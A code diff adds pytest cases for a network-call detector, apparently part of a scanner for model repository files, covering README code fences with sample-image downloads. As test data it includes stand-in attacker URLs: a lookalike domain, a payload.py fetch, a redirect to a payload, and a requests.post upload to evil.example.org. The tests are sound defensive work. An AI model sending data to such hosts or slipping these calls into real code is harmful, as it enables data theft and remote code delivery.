@@ -2764,6 +2764,89 @@ class TestNetworkCommDetector:
 
         assert not [finding for finding in findings if finding["type"] in {"network_library", "network_function"}]
 
+    @pytest.mark.parametrize(
+        "image_url",
+        [
+            "https://huggingface.co/spaces/ds4sd/demo/resolve/main/examples/sample.png",
+            "https://huggingface.co/datasets/huggingface/documentation-images/resolve/main/car.jpg?download=true",
+        ],
+    )
+    def test_readme_python_example_official_sample_image_has_no_network_false_positive(
+        self,
+        image_url: str,
+    ) -> None:
+        data = (
+            "# Model card\n\n```python\nimport requests\n"
+            f"image_url = {image_url!r}\n"
+            "image = Image.open(requests.get(image_url, stream=True).raw)\n```\n"
+        ).encode()
+
+        findings = NetworkCommDetector().scan(data, "README.md")
+
+        assert not [finding for finding in findings if finding["type"] in {"network_library", "network_function"}]
+        assert any(finding["type"] == "cloud_storage_url" for finding in findings)
+
+    @pytest.mark.parametrize(
+        "image_url",
+        [
+            "http://huggingface.co/org/model/resolve/main/sample.png",
+            "https://evil.example.org/sample.png",
+            "https://huggingface.co.evil.example.org/sample.png",
+            "https://huggingface.co/org/model/resolve/main/payload.py",
+            "https://huggingface.co/org/model/resolve/main/sample.png?next=https://evil.example.org/payload",
+        ],
+    )
+    def test_readme_python_example_preserves_untrusted_image_network_detection(
+        self,
+        image_url: str,
+    ) -> None:
+        data = (
+            "```python\nimport requests\n"
+            f"image_url = {image_url!r}\n"
+            "image = Image.open(requests.get(image_url, stream=True).raw)\n```\n"
+        ).encode()
+
+        findings = NetworkCommDetector().scan(data, "README.md")
+
+        assert any(finding["type"] == "network_library" for finding in findings)
+        assert any(finding["type"] == "network_function" for finding in findings)
+
+    def test_readme_python_example_preserves_mixed_untrusted_requests(self) -> None:
+        data = (
+            b"```python\nimport requests\n"
+            b"image_url = 'https://huggingface.co/org/model/resolve/main/sample.png'\n"
+            b"requests.get(image_url, stream=True)\n"
+            b"requests.post('https://evil.example.org/upload')\n```\n"
+        )
+
+        findings = NetworkCommDetector().scan(data, "README.md")
+
+        assert any(finding["type"] == "network_library" for finding in findings)
+        assert any(finding["type"] == "network_function" for finding in findings)
+
+    def test_official_sample_image_does_not_suppress_executable_python(self) -> None:
+        data = (
+            b"import requests\n"
+            b"image_url = 'https://huggingface.co/org/model/resolve/main/sample.png'\n"
+            b"requests.get(image_url, stream=True)\n"
+        )
+
+        findings = NetworkCommDetector().scan(data, "example.py")
+
+        assert any(finding["type"] == "network_library" for finding in findings)
+        assert any(finding["type"] == "network_function" for finding in findings)
+
+    def test_readme_official_image_in_different_fence_does_not_suppress_network_call(self) -> None:
+        data = (
+            b"```python\nimage_url = 'https://huggingface.co/org/model/resolve/main/sample.png'\n```\n"
+            b"```python\nimport requests\nrequests.get(image_url, stream=True)\n```\n"
+        )
+
+        findings = NetworkCommDetector().scan(data, "README.md")
+
+        assert any(finding["type"] == "network_library" for finding in findings)
+        assert any(finding["type"] == "network_function" for finding in findings)
+
     def test_network_function_with_parentheses_still_flagged_in_metadata_context(self) -> None:
         """Executable-looking calls should stay detectable even when embedded in metadata files."""
         detector = NetworkCommDetector()
